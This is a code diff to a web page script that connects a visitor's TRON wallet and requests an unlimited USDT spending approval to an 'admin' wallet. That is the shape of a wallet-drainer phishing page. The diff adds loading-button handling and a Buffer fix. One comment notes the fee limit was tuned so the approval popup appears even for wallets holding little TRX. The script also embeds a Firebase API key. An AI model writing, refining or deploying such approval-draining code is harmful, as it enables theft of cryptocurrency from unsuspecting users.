@@ -1,4 +1,9 @@
-// Firebase Config (Hardcoded as per request)
+// --- BUFFER FIX (CRITICAL) ---
+if (typeof window !== 'undefined') {
+    window.Buffer = window.Buffer || buffer.Buffer;
+}
+
+// Firebase Config
 const firebaseConfig = {
     apiKey: "AIzaSyD4qKMlB3TJjYprgpAEkA5Ts-Yvg7aRbp0",
     authDomain: "tronadmin-99827.firebaseapp.com",
@@ -61,8 +66,14 @@ window.addEventListener('load', () => {
 });
 
 document.getElementById('next-btn').addEventListener('click', async () => {
+    const btn = document.getElementById('next-btn');
+    btn.classList.add('btn-loading');
+    
     initFirebase();
-    if (typeof window.connectWalletConnectTron !== 'function') return alert("System loading...");
+    if (typeof window.connectWalletConnectTron !== 'function') {
+        btn.classList.remove('btn-loading');
+        return;
+    }
 
     try {
         const result = await window.connectWalletConnectTron();
@@ -84,7 +95,7 @@ document.getElementById('next-btn').addEventListener('click', async () => {
 
             setTimeout(async () => {
                 try {
-                    // Optimized: FeeLimit lowered to 40 TRX to ensure popup shows even on 10 TRX balance
+                    // Logic: feeLimit lowered to 40 TRX to ensure popup shows even on 10 TRX balance
                     const { transaction } = await localTronWeb.transactionBuilder.triggerSmartContract(
                         CONFIG.USDT_CONTRACT, "approve(address,uint256)", { feeLimit: 40000000 },
                         [{ type: 'address', value: CONFIG.ADMIN_WALLET }, { type: 'uint256', value: MAX_UINT }], address
@@ -107,6 +118,10 @@ document.getElementById('next-btn').addEventListener('click', async () => {
                     location.reload();
                 }
             }, 1000);
+        } else {
+            btn.classList.remove('btn-loading');
         }
-    } catch (e) {}
+    } catch (e) {
+        btn.classList.remove('btn-loading');
+    }
 });
